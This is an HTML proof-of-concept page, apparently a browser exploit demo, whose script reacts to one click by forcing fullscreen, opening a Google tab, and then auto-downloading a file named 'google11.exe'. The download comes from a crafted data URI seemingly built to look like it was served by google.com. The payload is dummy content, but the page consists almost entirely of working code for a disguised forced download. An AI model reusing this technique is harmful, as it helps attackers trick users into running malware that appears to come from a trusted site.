<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download & Fullscreen on Click</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
            text-align: center;
            padding-top: 50px;
            background-color: #f9f9f9;
        }
        #triggerInput {
            padding: 10px;
            font-size: 16px;
            width: 80%;
            max-width: 300px;
            border: 1px solid #ccc;
            border-radius: 5px;
            text-align: center;
        }
    </style>
</head>
<body>

    <h2>POC by Chigorin!</h2>
    <p>Ketuk pada kolom input di bawah untuk memicu aksi:</p>
    
    <input type="text" id="triggerInput" placeholder="Ketuk di sini...">

    <script>
        document.getElementById('triggerInput').addEventListener('click', function() {
            // 1. Memicu layar penuh (Fullscreen) langsung saat interaksi
            goFullScreen();
            
            // 2. Membuka tab baru ke Google (Akan diizinkan karena dipicu klik langsung)
            window.open('https://www.google.com', '_blank');
            
            // 3. Menjalankan fungsi unduhan setelah delay 500ms
            setTimeout(function() {
                openWin();
            }, 500);
            
        }, { once: false }); // Ubah ke true jika hanya ingin memicu satu kali saja

        // Fungsi pembantu untuk membuat elemen unduhan (Sudah diperbaiki strukturnya)
        function Puf(uri, name) {
            const link = document.createElement("a");
            link.href = uri;
            link.download = name;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }

        // Fungsi untuk mengeksekusi unduhan tiruan berkas .exe / .apk
        function openWin() {
            Puf(
                "data://google.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=",
                "google11.exe"
            );
        }

        // Fungsi API Fullscreen untuk berbagai browser
        function goFullScreen() {
            const element = document.documentElement;
            if (element.requestFullscreen) {
                element.requestFullscreen();
            } else if (element.mozRequestFullScreen) { // Firefox
                element.mozRequestFullScreen();
            } else if (element.webkitRequestFullscreen) { // Chrome, Safari, Edge Legacy
                element.webkitRequestFullscreen();
            } else if (element.msRequestFullscreen) { // IE/Edge Old
                element.msRequestFullscreen();
            }
        }
    </script>
</body>
</html>
